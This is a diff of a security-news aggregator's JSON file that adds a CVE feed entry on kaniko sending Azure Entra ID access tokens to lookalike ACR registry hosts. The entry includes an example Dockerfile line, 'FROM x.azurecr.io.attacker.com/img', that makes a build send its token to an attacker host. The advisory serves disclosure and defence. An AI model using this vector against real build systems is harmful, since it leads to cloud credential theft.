@@ -1,5 +1,5 @@
 {
-  "fetched_at": "2026-11-03T02:32:30.290163+09:00",
+  "fetched_at": "2026-11-03T03:01:29.297391+09:00",
   "security_news": [
     {
       "title": "美국무부, 바이낸스 해킹에 \"北 미사일 자금 사이버범죄 의존\"",
@@ -6003,6 +6003,21 @@
     }
   ],
   "vulnerability": [
+    {
+      "title": "CVE-2026-105769 - kaniko can send the build's Azure (Entra ID) access token to lookalike ACR registry hosts",
+      "summary": "CVE ID :CVE-2026-105769\n  \nPublished : Nov. 2, 2026, 4:49 p.m. | 17 minutes ago\n  \nDescription :kaniko before 1.25.20 can send a Microsoft Entra ID (Azure AD) access token for Azure Resource Manager to an attacker-controlled registry host. kaniko uses the Azure Container Registry credential helper github.com/chrismellard/docker-credential-acr-env, which decides whether a host is an ACR registry with an unanchored regular expression, so any hostname containing .azurecr.io, .azurecr.cn, .azurecr.de or .azurecr.us is accepted. kaniko consults this helper for any registry that has no credentials in the Docker config and is not a Google or Amazon ECR registry, before contacting the registry. A Dockerfile that references an image on a lookalike host, such as FROM x.azurecr.io.attacker.com/img or COPY --from=, causes the helper to obtain a token from the build's Azure identity (service principal environment variables, federated workload identity token, or managed identity) and POST it to https:///oauth2/exchange. The attacker can use the token against Azure Resource Manager with the identity's role assignments until it expires, and can exchange it for credentials to any ACR registry the identity can access. No RUN instruction or push is required. This issue is fixed in 1.25.20.\n  \nSeverity: 9.3 | CRITICAL\n  \n  Visit the link for more details, such as CVSS details, affected products, timeline, and more...",
+      "description": "CVE ID :CVE-2026-105769\n  \nPublished : Nov. 2, 2026, 4:49 p.m. | 17 minutes ago\n  \nDescription :kaniko before 1.25.20 can send a Microsoft Entra ID (Azure AD) access token for Azure Resource Manager to an attacker-controlled registry host. kaniko uses the Azure Container Registry credential helper github.com/chrismellard/docker-credential-acr-env, which decides whether a host is an ACR registry with an unanchored regular expression, so any hostname containing .azurecr.io, .azurecr.cn, .azurecr.de or .azurecr.us is accepted. kaniko consults this helper for any registry that has no credentials in the Docker config and is not a Google or Amazon ECR registry, before contacting the registry. A Dockerfile that references an image on a lookalike host, such as FROM x.azurecr.io.attacker.com/img or COPY --from=, causes the helper to obtain a token from the build's Azure identity (service principal environment variables, federated workload identity token, or managed identity) and POST it to https:///oauth2/exchange. The attacker can use the token against Azure Resource Manager with the identity's role assignments until it expires, and can exchange it for credentials to any ACR registry the identity can access. No RUN instruction or push is required. This issue is fixed in 1.25.20.\n  \nSeverity: 9.3 | CRITICAL\n  \n  Visit the link for more details, such as CVSS details, affected products, timeline, and more...",
+      "title_ko": null,
+      "summary_ko": null,
+      "summary_3lines": "1. CVE-2026-105769\n2. 26.11.03 오전1:49\n3. kaniko before 1.25.20 can send a Microsoft Entra I",
+      "cve_id": "CVE-2026-105769",
+      "cvss": "",
+      "severity": "",
+      "link": "https://cvefeed.io/vuln/detail/CVE-2026-105769",
+      "source": "cvefeed",
+      "published": "2026-11-03T01:49:24+09:00",
+      "lang": "en"
+    },
     {
       "title": "CVE-2026-99242 - ntfs: fix race between fallocate and mmap reads",
       "summary": "CVE ID :CVE-2026-99242\n  \nPublished : Nov. 2, 2026, 4:17 p.m. | 33 minutes ago\n  \nDescription :In the Linux kernel, the following vulnerability has been resolved:\n\nntfs: fix race between fallocate and mmap reads\n\nThe fallocate implementation only takes invalidate_lock for punch hole,\ncollapse range, and insert range operations. For standard allocation modes\n(mode == 0, FALLOC_FL_KEEP_SIZE), the lock is not held.\n\nDuring ntfs_attr_fallocate(), new clusters are mapped to the runlist via\nntfs_attr_map_cluster() before being zeroed by ntfs_dio_zero_range(). This\ncreates a window where concurrent mmap page faults can read uninitialized\ndisk data.\n\nSince mmap uses filemap_fault() which takes invalidate_lock in shared mode,\nit can fault in pages during this window and expose old disk contents to\nuserspace. This is an information leak and data integrity issue.\n\nFix by taking invalidate_lock for all fallocate operations, not just for\npunch/collapse/insert modes. This prevents concurrent page faults from\naccessing unzeroed clusters during the allocation window.\n  \nSeverity: 0.0 | NA\n  \n  Visit the link for more details, such as CVSS details, affected products, timeline, and more...",
